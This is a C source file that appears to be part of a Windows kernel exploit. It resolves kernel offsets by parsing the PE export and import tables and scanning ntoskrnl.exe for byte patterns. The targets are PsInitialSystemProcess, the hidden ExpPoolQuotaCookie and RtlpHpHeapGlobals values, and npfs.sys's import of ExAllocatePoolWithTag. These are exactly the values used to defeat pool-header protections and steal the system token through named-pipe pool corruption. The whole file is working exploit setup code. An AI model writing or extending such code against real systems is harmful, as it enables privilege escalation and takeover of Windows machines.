#include <stdio.h>
#include <windows.h>

#include "pe_utils/pe_utils.h"

// RVAs to kernel entities
DWORD g_nt_PsInitialSystemProcess_RVA = 0;
DWORD g_nt_ExAllocatePoolWithTag_RVA = 0;
DWORD g_nt_ExpPoolQuotaCookie_RVA = 0;
DWORD g_nt_RtlpHpHeapGlobals_RVA = 0;
DWORD g_Npfs_imp_ExAllocatePoolWithTag_RVA = 0;

// System module paths
#define NT_KERNEL_PATH "C:\\Windows\\System32\\ntoskrnl.exe"
#define NPFS_DRIVER_PATH "C:\\Windows\\System32\\drivers\\npfs.sys"

// Size of RIP-relative displacement field (32-bit)
#define RIP32_DISPLACEMENT_SIZE 4

BOOL ResolveKernelRvas()
{
    // Resolve exported system process variable RVA
    g_nt_PsInitialSystemProcess_RVA = ResolveEATEntryRva(
        NT_KERNEL_PATH,
        "PsInitialSystemProcess");
    if (g_nt_PsInitialSystemProcess_RVA == 0)
    {
        fprintf(stderr, "[-] Failed to resolve PsInitialSystemProcess\n");
        return FALSE;
    }
    printf("[+] g_nt_PsInitialSystemProcess_RVA: 0x%X\n", g_nt_PsInitialSystemProcess_RVA);

    // Resolve pool allocation function RVA
    g_nt_ExAllocatePoolWithTag_RVA = ResolveEATEntryRva(
        NT_KERNEL_PATH,
        "ExAllocatePoolWithTag");
    if (g_nt_ExAllocatePoolWithTag_RVA == 0)
    {
        fprintf(stderr, "[-] Failed to resolve ExAllocatePoolWithTag\n");
        return FALSE;
    }
    printf("[+] g_nt_ExAllocatePoolWithTag_RVA: 0x%X\n", g_nt_ExAllocatePoolWithTag_RVA);

    // Pattern for pool quota cookie references
    static const BYTE ExpPoolQuotaCookie_Pattern[] = {
        0x48, 0x0F, 0x44, 0xFE, 0x0F, 0xBD, 0xC8, 0x8B, 0xC6, 0x48, 0x89, 0x3D
        // 48 0F 44 FE          - cmovz rdi, rsi
        // 0F BD C8             - bsr ecx, eax
        // 8B C6                - mov eax, esi
        // 48 89 3D XX XX XX XX - mov cs:ExpPoolQuotaCookie, rdi
    };

    // Resolve pool quota cookie variable RVA
    g_nt_ExpPoolQuotaCookie_RVA = ResolveRip32RelativeRva(
        NT_KERNEL_PATH,
        ExpPoolQuotaCookie_Pattern,
        sizeof(ExpPoolQuotaCookie_Pattern),
        12 // Offset to displacement in mov instruction
    );
    if (g_nt_ExpPoolQuotaCookie_RVA == 0)
    {
        fprintf(stderr, "[-] Failed to resolve ExpPoolQuotaCookie\n");
        return FALSE;
    }
    printf("[+] g_nt_ExpPoolQuotaCookie_RVA: 0x%X\n", g_nt_ExpPoolQuotaCookie_RVA);

    // Pattern for heap globals references
    static const BYTE RtlpHpHeapGlobals_Pattern[] = {
        0x48, 0x83, 0xEC, 0x28, 0x0F, 0x57, 0xC0, 0x33, 0xC0, 0x0F, 0x11, 0x05
        // 48 83 EC 28          - sub rsp, 28h
        // 0F 57 C0             - xorps xmm0, xmm0
        // 33 C0                - xor eax, eax
        // 0F 11 05 XX XX XX XX - movups cs:RtlpHpHeapGlobals, xmm0
    };

    // Resolve heap globals variable RVA
    g_nt_RtlpHpHeapGlobals_RVA = ResolveRip32RelativeRva(
        NT_KERNEL_PATH,
        RtlpHpHeapGlobals_Pattern,
        sizeof(RtlpHpHeapGlobals_Pattern),
        12 // Offset to displacement in movups instruction
    );
    if (g_nt_RtlpHpHeapGlobals_RVA == 0)
    {
        fprintf(stderr, "[-] Failed to resolve RtlpHpHeapGlobals\n");
        return FALSE;
    }
    printf("[+] g_nt_RtlpHpHeapGlobals_RVA: 0x%X\n", g_nt_RtlpHpHeapGlobals_RVA);

    // Resolve pool allocation import in NPFS driver
    g_Npfs_imp_ExAllocatePoolWithTag_RVA = ResolveIATEntryRva(
        NPFS_DRIVER_PATH,
        "ntoskrnl.exe",
        "ExAllocatePoolWithTag");
    if (g_Npfs_imp_ExAllocatePoolWithTag_RVA == 0)
    {
        fprintf(stderr, "[-] Failed to resolve Npfs's import of ExAllocatePoolWithTag\n");
        return FALSE;
    }
    printf("[+] g_Npfs_imp_ExAllocatePoolWithTag_RVA: 0x%X\n", g_Npfs_imp_ExAllocatePoolWithTag_RVA);

    return TRUE;
}

DWORD ResolveIATEntryRva(const char* modulePath, const char* importDll, const char* functionName)
{
    // Load the target module
    HMODULE moduleBase = LoadLibraryExA(modulePath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!moduleBase)
    {
        fprintf(stderr, "[-] Failed to load module: %s (Error: %lu)\n", modulePath, GetLastError());
        return 0;
    }

    // Validate DOS header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        fprintf(stderr, "[-] Invalid DOS signature in %s\n", modulePath);
        FreeLibrary(moduleBase);
        return 0;
    }

    // Validate NT header
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        fprintf(stderr, "[-] Invalid PE signature in %s\n", modulePath);
        FreeLibrary(moduleBase);
        return 0;
    }

    // Find import directory
    DWORD importDirRVA = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importDirRVA == 0)
    {
        fprintf(stderr, "[-] Import directory not found in %s\n", modulePath);
        FreeLibrary(moduleBase);
        return 0;
    }

    // Process import descriptors
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)moduleBase + importDirRVA);
    DWORD targetRva = 0;

    while (importDesc->Name != 0)
    {
        char* currentDllName = (char*)((BYTE*)moduleBase + importDesc->Name);

        if (_stricmp(currentDllName, importDll) == 0)
        {
            // Use OriginalFirstThunk if available, otherwise use FirstThunk
            DWORD iltRVA = importDesc->OriginalFirstThunk;
            if (iltRVA == 0)
            {
                iltRVA = importDesc->FirstThunk;
            }

            PIMAGE_THUNK_DATA thunkILT = (PIMAGE_THUNK_DATA)((BYTE*)moduleBase + iltRVA);
            PIMAGE_THUNK_DATA thunkIAT = (PIMAGE_THUNK_DATA)((BYTE*)moduleBase + importDesc->FirstThunk);

            while (thunkILT->u1.AddressOfData != 0)
            {
                // Handle import by name
                if (!(thunkILT->u1.Ordinal & IMAGE_ORDINAL_FLAG))
                {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)moduleBase + thunkILT->u1.AddressOfData);

                    if (strcmp((char*)importByName->Name, functionName) == 0)
                    {
                        // Found the target function - calculate IAT entry RVA
                        targetRva = (DWORD)((BYTE*)thunkIAT - (BYTE*)moduleBase);
                        break;
                    }
                }

                thunkILT++;
                thunkIAT++;
            }
            break;
        }
        importDesc++;
    }

    FreeLibrary(moduleBase);
    return targetRva;
}

DWORD ResolveEATEntryRva(const char* modulePath, const char* functionName)
{
    // Load the target module
    HMODULE moduleBase = LoadLibraryExA(modulePath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!moduleBase)
    {
        fprintf(stderr, "[-] Failed to load module: %s (Error: %lu)\n", modulePath, GetLastError());
        return 0;
    }

    // Validate DOS header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        fprintf(stderr, "[-] Invalid DOS signature in %s\n", modulePath);
        FreeLibrary(moduleBase);
        return 0;
    }

    // Validate NT header
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        fprintf(stderr, "[-] Invalid PE signature in %s\n", modulePath);
        FreeLibrary(moduleBase);
        return 0;
    }

    // Find export directory
    DWORD exportDirRVA = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0)
    {
        fprintf(stderr, "[-] Export directory not found in %s\n", modulePath);
        FreeLibrary(moduleBase);
        return 0;
    }

    // Process export directory
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)moduleBase + exportDirRVA);
    PDWORD functionAddresses = (PDWORD)((BYTE*)moduleBase + exportDir->AddressOfFunctions);
    PDWORD nameAddresses = (PDWORD)((BYTE*)moduleBase + exportDir->AddressOfNames);
    PWORD nameOrdinals = (PWORD)((BYTE*)moduleBase + exportDir->AddressOfNameOrdinals);
    DWORD targetRva = 0;

    // Search for function by name
    for (DWORD exportIndex = 0; exportIndex < exportDir->NumberOfNames; exportIndex++)
    {
        char* currentName = (char*)((BYTE*)moduleBase + nameAddresses[exportIndex]);

        if (strcmp(currentName, functionName) == 0)
        {
            // Found the target function - get its RVA
            targetRva = functionAddresses[nameOrdinals[exportIndex]];
            break;
        }
    }

    FreeLibrary(moduleBase);
    return targetRva;
}

DWORD ResolveRip32RelativeRva(const char* modulePath, const BYTE* pattern, DWORD patternSize, DWORD ripDisplacementOffset)
{
    // Load the target module
    HMODULE moduleBase = LoadLibraryExA(modulePath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!moduleBase)
    {
        fprintf(stderr, "[-] Failed to load module: %s (Error: %lu)\n", modulePath, GetLastError());
        return 0;
    }

    // Get headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);

    // Scan through each code section
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
    DWORD targetRva = 0;

    for (int sectionIndex = 0; sectionIndex < ntHeader->FileHeader.NumberOfSections; sectionIndex++, sectionHeader++)
    {
        // Skip non-executable sections
        if ((sectionHeader->Characteristics & IMAGE_SCN_CNT_CODE) == 0)
        {
            continue;
        }

        BYTE* sectionBase = (BYTE*)moduleBase + sectionHeader->VirtualAddress;
        DWORD sectionSize = sectionHeader->Misc.VirtualSize;

        // Search for the pattern
        for (DWORD scanOffset = 0; scanOffset <= sectionSize - patternSize; scanOffset++)
        {
            if (memcmp(sectionBase + scanOffset, pattern, patternSize) == 0)
            {
                // Pattern found, resolve the 32-bit RIP-relative target
                DWORD instructionRva = sectionHeader->VirtualAddress + scanOffset + ripDisplacementOffset;

                // Read the 32-bit displacement value
                INT32 displacement = *(INT32*)(sectionBase + scanOffset + ripDisplacementOffset);

                // Calculate target RVA: Instruction_Addr + Displacement_Size + Displacement
                targetRva = instructionRva + RIP32_DISPLACEMENT_SIZE + displacement;
                break;
            }
        }

        if (targetRva != 0)
        {
            break;
        }
    }

    FreeLibrary(moduleBase);
    return targetRva;
}
